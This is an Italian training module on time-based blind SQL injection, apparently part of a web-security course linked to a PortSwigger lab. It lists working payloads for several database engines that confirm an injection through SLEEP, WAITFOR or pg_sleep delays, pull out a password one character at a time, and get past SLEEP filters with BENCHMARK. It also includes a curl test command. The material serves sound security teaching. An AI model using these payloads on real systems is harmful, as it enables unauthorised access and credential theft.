# Time-Based Blind SQLi

**Difficoltà:** Advanced
**Time to Master:** 2h
**Prerequisiti:** [04-Blind-SQLi.md](04-Blind-SQLi.md)
**Lab:** PortSwigger Academy: Blind SQLi with time delays

---

## Obiettivo

A volte nemmeno il differenziale booleano c'è: la pagina è identica in ogni caso, vero o falso. In quel vicolo cieco resta un'ultima leva: il tempo. Se riesci a far eseguire una `SLEEP` condizionale nel DB, la risposta arriva più lenta quando la condizione è vera — un segnale che nessuna sanitizzazione dell'output può nascondere. È la tecnica più lenta di tutte, ma anche l'ultima a cedere.

---

## Concetti chiave

### Principio

```sql
' OR IF(1=1, SLEEP(5), 0) --   -- risposta ritardata di 5s se la condizione è vera
```

È la tecnica più lenta ma anche la più affidabile: funziona anche quando l'output è completamente invisibile (es. la query è usata solo per un controllo interno, l'app risponde sempre uguale).

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| curl + time | `time curl URL` | tempo di risposta | misura manuale |
| Burp Intruder | payload con SLEEP | tempo risposta per tentativo | automatizza, guarda colonna "Response received" |
| sqlmap | `--technique=T` | automatizza tutto | ultima risorsa quando altro non funziona |

---

## Payload / Esempi

### Esempio 1: conferma time-based blind

```sql
' OR SLEEP(5) --
' AND SLEEP(5) --
1' AND IF(1=1,SLEEP(5),0)-- -
```

```bash
time curl "http://target.com/item?id=1' AND SLEEP(5)--%20"
```

**Output atteso:** la richiesta impiega ~5s in più rispetto al normale: conferma diretta dell'injection anche senza vedere alcun output.

### Esempio 2: estrazione dati con condizione booleana + sleep

```sql
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0) --
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>109, SLEEP(3), 0) --
```

**Spiegazione:** stesso principio della blind boolean, ma il "vero/falso" si misura in secondi di ritardo invece che in differenza di contenuto, molto più lento (una richiesta per ogni bit di informazione, con sleep multi-secondo), ma applicabile ovunque.

### Esempio 3: equivalenti per altri DB engine

```sql
-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5' --

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE 1 END FROM dual) --
```

---

## Evasion / Bypass Techniques

### Ridurre falsi positivi dovuti a latenza di rete

Esegui sempre una baseline (richiesta senza sleep) prima di interpretare un ritardo come conferma, e ripeti il test 2-3 volte per escludere variazioni casuali di rete.

### Bypass filtro su SLEEP

```sql
' AND BENCHMARK(5000000, SHA1('test')) --   -- alternativa a SLEEP in MySQL
```

---

## Lab Hands-On

### Lab 1: PortSwigger: Blind SQL injection with time delays
**Obiettivo:** confermare ed estrarre dati via time-based blind
**Difficulty:** Difficile
**Time:** 1h

**Walkthrough breve:**
1. Conferma con SLEEP(5) e misura il tempo di risposta
2. Costruisci condizione booleana con IF + SLEEP
3. Automatizza estrazione carattere per carattere (o passa a sqlmap per efficienza)

---

## Common Mistakes

- Non fare una baseline prima di concludere che il delay sia dovuto al payload -> la rete può introdurre latenza normale
- Usare sleep troppo lunghi in automazione -> rallenta enormemente l'estrazione, calibra il tempo minimo necessario per essere affidabile (2-3s spesso bastano)

---

## Link Utili

- [PortSwigger: Blind SQLi with time delays](https://portswigger.net/web-security/sql-injection/blind)

---

## Connessioni

- **Prerequisito:** [04-Blind-SQLi.md](04-Blind-SQLi.md)
- **Prossimo Step:** [06-Encoding-Bypasses.md](06-Encoding-Bypasses.md)

---

## Checklist di padronanza

- [ ] So confermare time-based blind con SLEEP
- [ ] So l'equivalente SLEEP per MySQL/MSSQL/PostgreSQL/Oracle
- [ ] So fare una baseline prima di interpretare un ritardo
- [ ] So quando passare a sqlmap invece di continuare manualmente

